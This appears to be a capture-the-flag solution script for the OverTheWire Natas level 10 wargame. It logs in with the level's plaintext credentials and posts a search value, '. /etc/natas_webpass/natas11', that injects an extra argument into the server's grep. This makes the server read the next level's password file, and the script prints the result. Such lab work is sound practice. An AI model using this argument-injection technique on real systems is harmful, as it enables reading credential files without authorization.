#!/usr/bin/python3

import requests
import re

username = 'natas10'
password = 'nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'

url = 'http://%s.natas.labs.overthewire.org' % username

response = requests.get(url, auth = (username, password))
content = response.text
# print(content)

data = {'needle':'. /etc/natas_webpass/natas11'}
response = requests.post(url, auth = (username, password),data=data)
content = response.text
# print(content)

pwd = re.findall('/etc/natas_webpass/natas11:(.*)', content)[0]
print(pwd)
